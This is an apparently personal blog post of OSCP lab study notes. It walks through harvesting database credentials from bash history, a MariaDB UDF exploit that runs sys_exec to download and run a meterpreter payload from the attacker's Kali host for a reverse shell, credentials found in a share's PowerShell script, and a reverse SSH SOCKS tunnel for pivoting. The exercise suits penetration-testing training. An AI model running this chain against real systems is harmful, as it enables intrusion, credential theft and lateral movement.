---
layout: post
title:  "OSCP Origin Part 24_4"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "Assembling the Pieces of Penetration Testing"
toc: true
comments: false
rating: 3.5
---

Assembling the Pieces of Penetration Testing

## Searching for DB Credentials

### Summary
- enumerating bash history give us way to find the credentials user name and password.
---
---

- When looking for credentials, we have to think like an administrator or developer. 

- Where would you store credentials? How would credentials be used? Are there any history or log files where credentials could be saved accidentally?


- An example of this is if a user of a server accidentally enters their password in the username field, which might be logged in **/var/log/auth.log. **

- Let’s think like an administrator and look at locations that might contain user information.


- We first start by looking at **/etc/passwd,/etc/group, and /etc/shadow** to get a feeling on how many users and groups have access to the target system.

- However, the **only useful piece of information we gather is that a user named “ajla” exists**. 

- Let’s check the user’s home directory to see what we can find.

```bash
root@ajla:~# cd /home/ajla
root@ajla:/home/ajla# ls -alh
total 32K
drwxr-xr-x 3 ajla ajla 4.0K Dec 10 16:37 .
drwxr-xr-x 3 root root 4.0K Dec 10 16:22 ..
-rw------- 1 ajla ajla 15 Dec 10 16:40 .bash_history
-rw-r--r-- 1 ajla ajla 220 Oct 15 17:49 .bash_logout
-rw-r--r-- 1 ajla ajla 3.7K Oct 15 17:49 .bashrc
drwx------ 2 ajla ajla 4.0K Oct 15 17:52 .cache
-rw-r--r-- 1 ajla ajla 675 Oct 15 17:49 .profile
-rw-r--r-- 1 ajla ajla 0 Oct 15 17:57 .sudo_as_admin_successful
```

- We don’t find much in the home directory, but let’s take a look at the .bash\_history to see what they have been up to.

```bash
root@ajla:/home/ajla# cat ./.bash_history
sudo poweroff
```

- This is interesting. A fairly empty history means the account is not used much. 

- The server must have been administered somehow but we don’t see any other users on the system.

-   Let’s check the root user’s history

```bash
root@ajla:/home/ajla# cat ~/.bash_history
pwd
ls
cd /var/log/apache2/
tail -f error.log
tail -f access.log
mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb -h 10.5.5.11 -e 'DROP DATABASE wordpress;'
cd /etc/mysql/
ls
cd ~/
ls
ls -alh
exit
exit 
root@ajla:/home/ajla#
```

- Excellent, the root user was used to administer Ajla and at one point, the MySQL client was used to drop the “wordpress” database. 

- ** Luckily for us, the password and user were entered directly in the command line!**

## Targeting the Database Again

### Summary
- through targeting the database get unprivileged shell  through previously obtained credentials.
---
---

- Now we have root database credentials for Zora’s MariaDB instance. Let’s go back and try the UDF exploit again using these new, higher-level, permissions.

## Exploitation

- As a reminder, the five commands that we are attempting to run against the MariaDB instance are found in Listing 933.

```bash
select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec';
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')
```

- First, we will rerun the MariaDB client but this time we will use the root credentials we discovered on Ajla.

```bash
kali@kali:~$ mysql --host=127.0.0.1 --port=13306 --user=root -p
Enter password:
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]>
```

- Next, we will set the shell variable to the shellcode that we generated earlier.

```bash
MariaDB [(none)]> set @shell = 0x7f454c4602010100000000000000000003003e000100000000110
000000000004000000000000000e03b0000000000000000000040003800090040001c001b0001000000040
00000000000...00000000000000000000;
```

- With the shell variable set, we will verify one more time that the plugin directory is still set to **/home/dev/plugin**.

-   While this isn’t necessary for the flow, it’s a good idea to be certain nothing has changed.

```bash
MariaDB [(none)]> select @@plugin_dir;
+-------------------+
| @@plugin_dir |
+-------------------+
| /home/dev/plugin/ |
+-------------------+
1 row in set (0.072 sec)
```

- Now for the moment of truth. Let’s attempt to dump the binary shell to a file.

```bash
MariaDB [(none)]> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so
';
Query OK, 1 row affected (0.078 sec)
```

- It worked! Before we get too excited, we still need to create a function.
```bash
MariaDB [(none)]> create function sys_exec returns int soname 'udf_sys_exec.so';
Query OK, 0 rows affected (0.078 sec)
```
- MariaDB did not provide us with any errors, leading us to believe that the function was created. 

- We can double check by running a command that queries for the sys\_exec function.

```bash
MariaDB [(none)]> select * from mysql.func where name='sys_exec';
+----------+-----+-----------------+----------+
| name | ret | dl | type |
+----------+-----+-----------------+----------+
| sys_exec | 2 | udf_sys_exec.so | function |
+----------+-----+-----------------+----------+
1 row in set (0.072 sec)
```
- Now let’s test if the sys\_exec UDF works by attempting to make a network call from Zora to our Kali machine.

-   To do this, we will start the python http.server on port 80 and make a sys\_exec UDF call to our Kali IP on port 80.

```bash
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ...
```
- Now that the web server has started, we can make the sys\_exec UDF call. 

- The syntax for the function can be found in the original UDF exploit.

```bash
MariaDB [(none)]> select sys_exec('wget http://10.11.0.4');
+-----------------------------------+
| sys_exec('wget http://10.11.0.4') |
+-----------------------------------+
| 256 |
+-----------------------------------+
1 row in set (0.230 sec)
```

- If the command worked, we should see a log entry in our webserver.

```bash
Serving HTTP on 0.0.0.0 port 80 ...
10.11.1.250 - - [10/Dec/2019 17:49:05] "GET / HTTP/1.1" 200 -
```
- Now we can upload and execute a meterpreter payload on Zora in order to send a reverse shell back to our Kali instance. 

- We don’t have to generate a new meterpreter shell since we can just use the same one we used for Ajla. 

- Since we are now connected to Ajla through a standard ssh connection, we can use port 443 on Kali for the Zora meterpreter session.

-   First, let’s instruct Zora to download the binary payload.

```bash
   

MariaDB \[(none)\]> select sys\_exec('wget http://10.11.0.4/shell.elf');  
+---------------------------------------------+  
| sys\_exec('wget http://10.11.0.4/shell.elf') |  
+---------------------------------------------+  
| 0 |  
+---------------------------------------------+  
1 row in set (0.260 sec)
```
- With the meterpreter downloaded, we need to make the file executable.
```bash
   

MariaDB \[(none)\]> select sys\_exec('chmod +x ./shell.elf');  
+----------------------------------+  
| sys\_exec('chmod +x ./shell.elf') |  
+----------------------------------+  
| 0 |  
+----------------------------------+  
1 row in set (0.074 sec)
```

- Now that the shell is executable, let’s restart msfconsole on Kali to have a fresh environment.

```bash
msf5 exploit(multi/handler) > exit
kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler;\
 set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
 set LHOST 10.11.0.4;\
 set LPORT 443;\
 run"
...
[*] Started reverse TCP handler on 10.11.0.4:443 
```

- With our listener configured and running, we can execute the shell on Zora.

```bash
MariaDB [(none)]> select sys_exec('./shell.elf');
```

- Now we can go back to msfconsole and check if we captured the shell.
 
```bash
[*] Started reverse TCP handler on 10.11.0.4:443
[*] Sending stage (985320 bytes) to 10.11.1.250
[*] Meterpreter session 1 opened (10.11.0.4:443 -> 10.11.1.250:27904) at 18:00:32
meterpreter > shell
Process 3972 created.
Channel 1 created.
whoami
mysql
```

- Excellent, we have a working unprivileged shell on Zora!

1 Modify the original Python exploit and capture the reverse shell.

2 The original UDF exploit is advertised as a privilege escalation exploit. Why are we getting an unprivileged shell?

## Post Exploitation Enumeration
### Summary
- enumerating and find post exploitation things
---
---

- Now that we have a shell on Zora, let’s collect some general information about the host to see what we can learn. 

- Let’s start by checking the flavor of Linux that is running

```bash
meterpreter > shell
Process 4469 created.
Channel 2 created.
cat /etc/issue
Welcome to Alpine Linux 3.10
Kernel \r on an \m (\l)
```

- A quick Google search shows us that Alpine Linux is “**a security-oriented, lightweight Linux distribution based on musl libc and busybox**”.

-   This is u**seful information as we can expect this OS to not have very many services or applications running**. 

-   **Anything out of the ordinary might be a good target. Let’s continue to collect information.**

```bash
cat /proc/version
Linux version 4.19.78-0-virt (buildozer@build-3-10-x86_64) (gcc version 8.3.0 (Alpine
8.3.0)) #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019
```

- The **/proc/version file** tells us that the** distro was built in October of 2019.**

-   Other than that, **we can take note of the kernel version and move forward.**

- Let’s have a look at the environment variables.

```bash
env
USER=mysql
SHLVL=1
HOME=/var/lib/mysql
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/loca
l/games:/system/bin:/system/sbin:/system/xbin
LANG=C
PWD=/var/lib/mysql
```

- Unfortunately, the environment variables don’t tell us much. 

- Looking at the output for ps aux also does not reveal any useful information on what we could exploit.

-   **Let’s run netstat to see if we have access to any new ports not exposed from the sandbox external network.**

```bash
netstat -tulpn
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -
tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN -
tcp 0 0 :::22 :::* LISTEN -
udp 0 0 127.0.0.1:323 0.0.0.0:* -
udp 0 0 ::1:323 :::* -
```

- Similar to the running services, the open ports don’t provide us with any new information.

-   Let’s check what the filesystem looks like.

```bash
cat /etc/fstab
UUID=ede2f74e-f23a-441c-b9cb-156494837ef3 / ext4 rw,relatime 0 1
UUID=8e53ca17-9437-4f54-953c-0093ce5066f2 /boot ext4 rw,relatime 0 2
UUID=ed8db3c1-a3c8-45fb-b5ec-f8e1529a8046 swap swap defaults 0 0
/dev/cdrom /media/cdrom iso9660 noauto,ro 0 0
/dev/usbdisk /media/usb vfat noauto 0 0
//10.5.5.20/Scripts /mnt/scripts cifs uid=0,gid=0,username=,password=,_netdev 0 0
```

- The contents of** /etc/fstab** are interesting. 

- **A share is mounted from the 10.5.5.20 host.** 

- Let’s poke around the scripts share and see what we find.

```bash
cd /mnt/scripts
ls
nas_setup.yml
olduserlookup.ps1
system_report.ps1
temp_folder_cleanup.bat
cat system_report.ps1
# find a better way to automate this
$username = "sandbox\alex"
$pwdTxt = "Ndawc*nRoqkC+haZ"
$securePwd = $pwdTxt | ConvertTo-SecureString
$credObject = New-Object System.Management.Automation.PSCredential -ArgumentList $user
name, $securePwd
# Enable remote management on Poultry
$remoteKeyParams = @{
ComputerName = "POULTRY"
Path = 'HKLM:\SOFTWARE\Microsoft\WebManagement\Server'
Name = 'EnableRemoteManagement'
Value = '1'
}
Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject
# Strange calc processes running lately

```

- We seem to have discovered a set of credentials in **the system\_report.ps1** file. 

- The **user name is “sandbox\\alex” **and the **password is "Ndawc\*nRoqkC+haZ“**. 

- We also seem to have found the name of the target where the share is mounted,”Poultry“. 

- Looking at the type of scripts in this directory and taking into account that the **user seems to be a part of the”sandbox" domain**, 

- we might be looking at a Windows computer.

> It’s a good habit to download the scripts you’ve discovered and save them in your notes. 

> You never know when something might get deleted or when a client might ask for more evidence.

## Creating stable Reverse Tunnel
- Similar to when we had unprivileged shell access to Ajla via the **www-data user**, we can’t use a standard ssh connection for Zora using the mysql account since this user does not have shell access by default.

- While we can create a ssh tunnel similar to the one used on Ajla, there is another option that we can set up since Zora is running such a recent version of Alpine.

-   **Newer versions of the ssh client allow us to establish a very useful type of tunnel via reverse dynamic port forwarding**.

```bash
ssh -V
OpenSSH_8.1p1, OpenSSL 1.1.1d 10 Sep 2019
```

- **Zora is running ssh version OpenSSH\_8.1p1**, which should support this feature.

-   If we can get this to work, we will have full **network access to the 10.5.5.0/24 sandbox internal network through a SOCKS proxy running on our Kali machine.**

- Since we only have access to a meterpreter shell, we need to create a new ssh key on Zora and run the ssh client in a way that does not require interaction. 

- ** First, let’s generate an ssh key on Zora.

- ** We will use the meterpreter shell for this.

```bash
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/var/lib/mysql/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Created directory '/var/lib/mysql/.ssh'.
Your identification has been saved in /var/lib/mysql/.ssh/id_rsa.
Your public key has been saved in /var/lib/mysql/.ssh/id_rsa.pub.
...
cat /var/lib/mysql/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4cjmvS... mysql@zora
```

- With the SSH keys generated, we need to set up the authorized\_keys file on our Kali machine for the kali user with the same type of restrictions as we did earlier. 

- An example of the entry can be found in . 

```bash
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",
no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4c
jmvS... mysql@zora
```

- The “from” IP does not have to change since the traffic is still coming from the external firewall as far as our Kali system is concerned.

-   The ssh command we use does have to change a bit though. 
   
-   This time, we don’t need multiple remote port forwarding options. 

-   We will only need one port forwarding option, which is -R 1080. 

-   By not including a host after the port, ssh is instructed to create a SOCKS proxy on our Kali server.

-   739 We also need to change the location of the private key.

```bash
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /
var/lib/mysql/.ssh/id_rsa kali@10.11.0.4
```

- Running this command in the meterpreter shell should initiate the ssh connection to our Kali machine.

```bash
<span custom-style="BoldCodeUser">ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null"
-o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@10.11.0.4/cu>
Warning: Permanently added '10.11.0.4' (ECDSA) to the list of known hosts.
```

- We can **double check that the port was opened by running netstat on our Kali system**.

```bash
kali@kali:~$ sudo netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/systemd
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 645/sshd
tcp 0 0 127.0.0.1:1080 0.0.0.0:* LISTEN 99765/sshd: kali
tcp6 0 0 :::111 :::* LISTEN 1/systemd
tcp6 0 0 :::22 :::* LISTEN 645/sshd
tcp6 0 0 ::1:1080 :::* LISTEN 99765/sshd: kali
udp 0 0 0.0.0.0:1194 0.0.0.0:* 94368/openvpn
udp 0 0 0.0.0.0:111 0.0.0.0:* 1/systemd
udp6 0 0 :::111 :::* 1/systemd
```

- With the dynamic reverse tunnel established, we can configure proxychains on Kali to use the SOCKS proxy.

-   We can do this by opening **etc/proxychains.conf ** and editing the last line, specifying port 1080.

```bash
# proxychains.conf VER 3.1
#
# HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#
 ...
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 1080
```

[[Proxy chain | How proxy chains work]]